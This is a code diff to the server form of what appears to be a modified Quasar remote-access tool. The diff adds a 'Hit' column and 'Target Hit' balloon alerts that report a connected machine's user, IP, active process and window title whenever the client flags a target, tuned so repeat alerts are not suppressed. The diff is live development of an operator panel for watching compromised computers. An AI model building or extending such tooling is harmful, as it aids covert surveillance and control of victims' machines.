@@ -23,16 +23,22 @@ namespace Quasar.Server.Forms
         public QuasarServer ListenServer { get; set; }
 
         /* Column order:
-         * Uuid(0), Status(1), Accept Ping(2), Install(3), Last ping(4), Version(5),
-         * Country(6), IP Address(7), OS(8), Warsal(9), Tag(10), Account Type(11), User@PC(12) */
+         * Uuid(0), Status(1), Hit(2), Accept Ping(3), Install(4), Last ping(5), Version(6),
+         * Country(7), IP Address(8), OS(9), Warsal(10), Tag(11), Account Type(12), User@PC(13) */
         private const int UUID_ID = 0;
         private const int STATUS_ID = 1;
-        private const int ACCEPT_PING_ID = 2;
-        private const int INSTALL_TIME_ID = 3;
-        private const int LAST_PING_TIME_ID = 4;
-        private const int IP_ADDRESS_ID = 7;
-        private const int WARSAL_ID = 9;
-        private const int TAG_ID = 10;
+        private const int HIT_ID = 2;
+        private const int ACCEPT_PING_ID = 3;
+        private const int INSTALL_TIME_ID = 4;
+        private const int LAST_PING_TIME_ID = 5;
+        private const int VERSION_ID = 6;
+        private const int COUNTRY_ID = 7;
+        private const int IP_ADDRESS_ID = 8;
+        private const int OS_ID = 9;
+        private const int WARSAL_ID = 10;
+        private const int TAG_ID = 11;
+        private const int ACCOUNT_TYPE_ID = 12;
+        private const int USER_PC_ID = 13;
 
         private bool _titleUpdateRunning;
         private bool _processingClientConnections;
@@ -59,7 +65,9 @@ namespace Quasar.Server.Forms
         private ToolStripStatusLabel _countsStatusLabel;
         private ToolStripStatusLabel _filteredStatusLabel;
         private ToolStripStatusLabel _statusSpacer;
-
+        private ComboBox _hitCombo;
+        private ListViewItem _hitComboItem;
+        private int _targetHitToastSeq;
         public FrmMain()
         {
             _clientStatusHandler = new ClientStatusHandler();
@@ -67,6 +75,17 @@ namespace Quasar.Server.Forms
             RegisterMessageHandler();
             InitializeComponent();
             _clientDb = new ClientDatabase();
+            _hitCombo = new ComboBox
+            {
+                DropDownStyle = ComboBoxStyle.DropDownList,
+                Visible = false,
+                TabStop = true
+            };
+            _hitCombo.Items.Add("Pending");
+            _hitCombo.Items.Add("Viewed");
+            _hitCombo.SelectionChangeCommitted += HitCombo_SelectionChangeCommitted;
+            _hitCombo.LostFocus += HitCombo_LostFocus;
+            Controls.Add(_hitCombo);
             lstClients.OwnerDraw = true;
             lstClients.DrawColumnHeader += lstClients_DrawColumnHeader;
             lstClients.DrawItem += lstClients_DrawItem;
@@ -360,21 +379,22 @@ namespace Quasar.Server.Forms
             foreach (ListViewItem item in lstClients.Items)
             {
                 bool keep = true;
-                if (item == null || item.SubItems.Count <= TAG_ID) keep = false;
+                if (item == null || item.SubItems.Count <= USER_PC_ID) keep = false;
                 if (!keep) { toRemove.Add(item); continue; }
 
                 string uuid = item.SubItems[UUID_ID].Text ?? "";
                 string status = item.SubItems[STATUS_ID].Text ?? "";
-                string version = item.SubItems[5].Text ?? "";
-                string country = item.SubItems[6].Text ?? "";
+                string version = item.SubItems[VERSION_ID].Text ?? "";
+                string country = item.SubItems[COUNTRY_ID].Text ?? "";
                 string ip = item.SubItems[IP_ADDRESS_ID].Text ?? "";
-                string os = item.SubItems[8].Text ?? "";
+                string os = item.SubItems[OS_ID].Text ?? "";
                 string warsal = item.SubItems.Count > WARSAL_ID ? (item.SubItems[WARSAL_ID].Text ?? "") : "";
                 string tag = item.SubItems[TAG_ID].Text ?? "";
+                string hit = item.SubItems[HIT_ID].Text ?? "";
 
                 if (termLower.Length > 0)
                 {
-                    var hay = (uuid + " " + version + " " + country + " " + ip + " " + os + " " + warsal + " " + tag).ToLowerInvariant();
+                    var hay = (uuid + " " + version + " " + country + " " + ip + " " + os + " " + warsal + " " + tag + " " + hit).ToLowerInvariant();
                     if (!hay.Contains(termLower)) keep = false;
                 }
 
@@ -670,6 +690,21 @@ namespace Quasar.Server.Forms
                 return;
             }
 
+            if (e.ColumnIndex == HIT_ID)
+            {
+                string text = string.IsNullOrWhiteSpace(e.SubItem?.Text) ? "Viewed" : e.SubItem.Text;
+                var btnRect = new Rectangle(e.Bounds.Right - 19, e.Bounds.Top + 2, 17, e.Bounds.Height - 4);
+                var textRect = new Rectangle(e.Bounds.Left + 4, e.Bounds.Top, e.Bounds.Width - 24, e.Bounds.Height);
+                if (Application.RenderWithVisualStyles && ComboBoxRenderer.IsSupported)
+                    ComboBoxRenderer.DrawDropDownButton(e.Graphics, btnRect, ComboBoxState.Normal);
+                else
+                    ControlPaint.DrawComboButton(e.Graphics, btnRect, ButtonState.Normal);
+                TextRenderer.DrawText(
+                    e.Graphics, text, e.SubItem.Font, textRect, rowFore,
+                    TextFormatFlags.Left | TextFormatFlags.VerticalCenter | TextFormatFlags.EndEllipsis);
+                return;
+            }
+
             if (e.ColumnIndex == ACCEPT_PING_ID)
             {
                 bool accept = false;
@@ -724,23 +759,97 @@ namespace Quasar.Server.Forms
                 TextFormatFlags.HorizontalCenter | TextFormatFlags.VerticalCenter | TextFormatFlags.EndEllipsis);
         }
 
-        private void lstClients_MouseUp(object sender, MouseEventArgs e)
+        private int GetColumnIndexFromX(int x)
         {
-            if (_loadingDbRows != 0) return;
-            var hit = lstClients.HitTest(e.Location);
-            if (hit?.Item == null) return;
-
-            /* Determine which column was clicked by comparing X against column boundaries. */
-            int x = e.Location.X;
             int col = 0;
             int left = 0;
             foreach (ColumnHeader ch in lstClients.Columns)
             {
                 int right = left + ch.Width;
-                if (x >= left && x < right) { break; }
+                if (x >= left && x < right) return col;
                 left = right;
                 col++;
             }
+            return col;
+        }
+
+        private Rectangle GetSubItemBounds(ListViewItem item, int columnIndex)
+        {
+            if (item == null || columnIndex < 0 || columnIndex >= lstClients.Columns.Count)
+                return Rectangle.Empty;
+            int left = item.Bounds.Left;
+            for (int i = 0; i < columnIndex; i++)
+                left += lstClients.Columns[i].Width;
+            return new Rectangle(left, item.Bounds.Top, lstClients.Columns[columnIndex].Width, item.Bounds.Height);
+        }
+
+        private void HideHitCombo()
+        {
+            if (!_hitCombo.Visible) return;
+            _hitCombo.Visible = false;
+            _hitComboItem = null;
+        }
+
+        private void ShowHitCombo(ListViewItem item)
+        {
+            if (item == null || item.SubItems.Count <= HIT_ID) return;
+            _hitComboItem = item;
+            var r = GetSubItemBounds(item, HIT_ID);
+            Point screenTopLeft = lstClients.PointToScreen(new Point(r.Left, r.Top));
+            _hitCombo.Parent = this;
+            Point loc = PointToClient(screenTopLeft);
+            _hitCombo.SetBounds(loc.X, loc.Y, Math.Max(r.Width, 72), Math.Max(r.Height, 22));
+            string cur = item.SubItems[HIT_ID].Text?.Trim() ?? "";
+            _hitCombo.SelectedIndex = string.Equals(cur, "Pending", StringComparison.OrdinalIgnoreCase) ? 0 : 1;
+            _hitCombo.Visible = true;
+            _hitCombo.BringToFront();
+            _hitCombo.Focus();
+        }
+
+        private void HitCombo_SelectionChangeCommitted(object sender, EventArgs e)
+        {
+            if (_hitComboItem == null || _hitComboItem.SubItems.Count <= HIT_ID) return;
+            string uuid = _hitComboItem.SubItems[UUID_ID].Text;
+            if (string.IsNullOrWhiteSpace(uuid)) return;
+            string val = _hitCombo.SelectedItem?.ToString() ?? "Viewed";
+            _hitComboItem.SubItems[HIT_ID].Text = val;
+            _clientDb.SetClientHitState(uuid, val);
+            lstClients.Invalidate(GetSubItemBounds(_hitComboItem, HIT_ID));
+            HideHitCombo();
+        }
+
+        private void HitCombo_LostFocus(object sender, EventArgs e)
+        {
+            BeginInvoke(new Action(() =>
+            {
+                if (!_hitCombo.Visible) return;
+                if (_hitCombo.DroppedDown) return;
+                if (ActiveControl == _hitCombo) return;
+                HideHitCombo();
+            }));
+        }
+
+        private void lstClients_MouseUp(object sender, MouseEventArgs e)
+        {
+            if (_loadingDbRows != 0) return;
+            var hit = lstClients.HitTest(e.Location);
+            if (hit?.Item == null)
+            {
+                HideHitCombo();
+                return;
+            }
+
+            int col = GetColumnIndexFromX(e.Location.X);
+
+            if (col == HIT_ID)
+            {
+                ShowHitCombo(hit.Item);
+                return;
+            }
+
+            if (_hitCombo.Visible)
+                HideHitCombo();
+
             if (col != ACCEPT_PING_ID) return;
 
             var item = hit.Item;
@@ -758,6 +867,7 @@ namespace Quasar.Server.Forms
 
         private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
         {
+            HideHitCombo();
             ListenServer.Disconnect();
             UnregisterMessageHandler();
             notifyIcon.Visible = false;
@@ -903,6 +1013,7 @@ namespace Quasar.Server.Forms
                     serverTag = client.Value.Tag ?? "";
                 client.Value.Tag = serverTag;
                 string warsalDisplay = _clientDb.GetClientWarsalDisplayString(uuid);
+                string hitDisplay = ClientDatabase.NormalizeHitState(_clientDb.GetClientHitState(uuid));
 
                 var row = _clientDb.UpsertClientBasics(
                     uuid,
@@ -925,18 +1036,19 @@ namespace Quasar.Server.Forms
                     lviExisting.ImageIndex = -1;
                     lviExisting.SubItems[0].Text = uuid;
                     lviExisting.SubItems[1].Text = status;
+                    lviExisting.SubItems[HIT_ID].Text = hitDisplay;
                     lviExisting.SubItems[ACCEPT_PING_ID].Tag = _clientDb.GetClientAcceptPing(uuid);
-                    lviExisting.SubItems[3].Text = FormatNullableUtc(row.InstallTimeUtc);
-                    lviExisting.SubItems[4].Text = FormatNullableUtc(row.LastPingTimeUtc);
-                    lviExisting.SubItems[5].Text = client.Value.Version;
-                    lviExisting.SubItems[6].Text = client.Value.CountryWithCode;
+                    lviExisting.SubItems[INSTALL_TIME_ID].Text = FormatNullableUtc(row.InstallTimeUtc);
+                    lviExisting.SubItems[LAST_PING_TIME_ID].Text = FormatNullableUtc(row.LastPingTimeUtc);
+                    lviExisting.SubItems[VERSION_ID].Text = client.Value.Version;
+                    lviExisting.SubItems[COUNTRY_ID].Text = client.Value.CountryWithCode;
                     lviExisting.SubItems[IP_ADDRESS_ID].Text = " " + client.EndPoint.Address;
                     lviExisting.SubItems[IP_ADDRESS_ID].Tag = client.Value.ImageIndex;
-                    lviExisting.SubItems[8].Text = client.Value.OperatingSystem;
+                    lviExisting.SubItems[OS_ID].Text = client.Value.OperatingSystem;
                     lviExisting.SubItems[WARSAL_ID].Text = warsalDisplay;
                     lviExisting.SubItems[TAG_ID].Text = serverTag;
-                    lviExisting.SubItems[11].Text = client.Value.AccountType;
-                    lviExisting.SubItems[12].Text = client.Value.UserAtPc;
+                    lviExisting.SubItems[ACCOUNT_TYPE_ID].Text = client.Value.AccountType;
+                    lviExisting.SubItems[USER_PC_ID].Text = client.Value.UserAtPc;
                 }
                 else
                 {
@@ -945,6 +1057,7 @@ namespace Quasar.Server.Forms
                     {
                         uuid,                          // Uuid
                         status,                       // Status
+                        hitDisplay,                   // Hit
                         "",                           // Accept Ping (checkbox)
                         FormatNullableUtc(row.InstallTimeUtc), // Install Time
                         FormatNullableUtc(row.LastPingTimeUtc), // Last Ping
@@ -1021,17 +1134,17 @@ namespace Quasar.Server.Forms
                         lvi.ImageIndex = -1;
                         lvi.SubItems[0].Text = uuid;
                         lvi.SubItems[1].Text = "Disconnected";
-                        lvi.SubItems[3].Text = FormatNullableUtc(row.InstallTimeUtc);
-                        lvi.SubItems[4].Text = FormatNullableUtc(row.LastPingTimeUtc);
-                        lvi.SubItems[5].Text = client.Value.Version;
-                        lvi.SubItems[6].Text = client.Value.CountryWithCode;
+                        lvi.SubItems[INSTALL_TIME_ID].Text = FormatNullableUtc(row.InstallTimeUtc);
+                        lvi.SubItems[LAST_PING_TIME_ID].Text = FormatNullableUtc(row.LastPingTimeUtc);
+                        lvi.SubItems[VERSION_ID].Text = client.Value.Version;
+                        lvi.SubItems[COUNTRY_ID].Text = client.Value.CountryWithCode;
                         lvi.SubItems[IP_ADDRESS_ID].Text = " " + client.EndPoint.Address;
                         lvi.SubItems[IP_ADDRESS_ID].Tag = client.Value.ImageIndex;
-                        lvi.SubItems[8].Text = client.Value.OperatingSystem;
+                        lvi.SubItems[OS_ID].Text = client.Value.OperatingSystem;
                         lvi.SubItems[WARSAL_ID].Text = warsalDisplay;
                         lvi.SubItems[TAG_ID].Text = serverTag;
-                        lvi.SubItems[11].Text = client.Value.AccountType;
-                        lvi.SubItems[12].Text = client.Value.UserAtPc;
+                        lvi.SubItems[ACCOUNT_TYPE_ID].Text = client.Value.AccountType;
+                        lvi.SubItems[USER_PC_ID].Text = client.Value.UserAtPc;
                     }
                 });
                 UpdateWindowTitle();
@@ -1110,13 +1223,25 @@ namespace Quasar.Server.Forms
             _clientDb.UpdateClientLastPingTimeUtc(uuid, pingTimeUtc);
 
             var item = GetListViewItemByClient(client);
+            if (ping?.TargetHit ?? false)
+            {
+                _clientDb.SetClientHitState(uuid, "Pending");
+                if (item != null && item.SubItems.Count > HIT_ID)
+                {
+                    item.SubItems[HIT_ID].Text = "Pending";
+                    lstClients.Invalidate(GetSubItemBounds(item, HIT_ID));
+                }
+            }
+
             if (item != null)
             {
                 item.SubItems[LAST_PING_TIME_ID].Text = FormatNullableUtc(pingTimeUtc);
             }
             UpdateStatusCounts();
 
-            /* Always show a toast on ping, regardless of Accept Ping. */
+            /* Always show a toast on ping, regardless of Accept Ping.
+             * Target-hit balloons use ms precision + process/window so Windows does not suppress repeats
+             * while the Hit column stays Pending. */
             try
             {
                 this.Invoke((MethodInvoker)delegate
@@ -1127,12 +1252,27 @@ namespace Quasar.Server.Forms
                         who = string.IsNullOrWhiteSpace(client.Value.Username) ? (uuid ?? "Client") : $"{client.Value.Username}@{client.Value.PcName}";
                     bool isTargetHit = ping?.TargetHit ?? false;
                     string status = acceptPing ? "accepted" : "ignored";
+                    string body;
+                    if (isTargetHit)
+                    {
+                        string proc = ping?.ActiveProcessName ?? "";
+                        string win = ping?.ActiveWindowTitle ?? "";
+                        if (string.IsNullOrWhiteSpace(proc)) proc = "(unknown process)";
+                        if (string.IsNullOrWhiteSpace(win)) win = "(unknown window title)";
+                        string when = pingTimeUtc.ToLocalTime().ToString("yyyy-MM-dd HH:mm:ss.fff");
+                        /* Monotonic id so the shell treats each target-hit balloon as distinct (avoids coalescing). */
+                        int seq = System.Threading.Interlocked.Increment(ref _targetHitToastSeq);
+                        body = $"{who} ({ip}) target hit at {when}\nProcess: {proc}\nWindow: {win}\n({seq})";
+                    }
+                    else
+                    {
+                        body = $"{who} ({ip}) ping {status} at {FormatNullableUtc(pingTimeUtc)}";
+                    }
+
                     notifyIcon.ShowBalloonTip(
-                        2000,
+                        isTargetHit ? 4000 : 2000,
                         isTargetHit ? "Target Hit" : "Ping received",
-                        isTargetHit
-                            ? $"{who} ({ip}) target hit at {FormatNullableUtc(pingTimeUtc)}"
-                            : $"{who} ({ip}) ping {status} at {FormatNullableUtc(pingTimeUtc)}",
+                        body,
                         ToolTipIcon.Info);
                 });
             }
@@ -1221,17 +1361,18 @@ namespace Quasar.Server.Forms
                             {
                                 r.Uuid ?? "",                          // 0  Uuid
                                 r.Status ?? "Disconnected",            // 1  Status
-                                "",                                    // 2  Accept Ping (checkbox)
-                                FormatNullableUtc(r.InstallTimeUtc),   // 3  Install
-                                FormatNullableUtc(r.LastPingTimeUtc),  // 4  Last Ping
-                                r.Version ?? "",                       // 5  Version
-                                countryWithCode,                       // 6  Country
-                                " " + (r.IpAddress ?? ""),             // 7  IP Address
-                                r.OperatingSystem ?? "",               // 8  OS
-                                r.Warsals ?? "",                       // 9  Warsal
-                                r.Tag ?? "",                           // 10 Tag
-                                r.AccountType ?? "",                   // 11 Account Type
-                                r.UserPc ?? ""                         // 12 User@PC
+                                ClientDatabase.NormalizeHitState(r.HitState), // 2  Hit
+                                "",                                    // 3  Accept Ping (checkbox)
+                                FormatNullableUtc(r.InstallTimeUtc),   // 4  Install
+                                FormatNullableUtc(r.LastPingTimeUtc),  // 5  Last Ping
+                                r.Version ?? "",                       // 6  Version
+                                countryWithCode,                       // 7  Country
+                                " " + (r.IpAddress ?? ""),             // 8  IP Address
+                                r.OperatingSystem ?? "",               // 9  OS
+                                r.Warsals ?? "",                       // 10 Warsal
+                                r.Tag ?? "",                           // 11 Tag
+                                r.AccountType ?? "",                   // 12 Account Type
+                                r.UserPc ?? ""                         // 13 User@PC
                             })
                             {
                                 Tag = null,
